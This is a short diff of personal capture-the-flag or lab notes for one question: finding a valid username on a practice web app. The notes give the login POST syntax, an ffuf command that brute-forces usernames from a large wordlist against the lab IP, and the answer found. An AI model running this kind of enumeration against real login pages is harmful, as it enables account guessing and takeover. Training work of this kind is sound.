@@ -1,1 +1,7 @@
+CHALLENGE: 94.237.63.208:54721
 
+Question 1 - Enumerate a valid user on the web application. Provide the username as the answer.
+1) go to http://94.237.63.208:54721
+2) right click -> inspector -> netowrk -> type in fake user and pass and hit enter -> find post request and go to the request tab to see how the syntax is: username=test&password=tester
+3) ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.63.208:54721/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown user."
+4) we eventually get the output of: cookster 
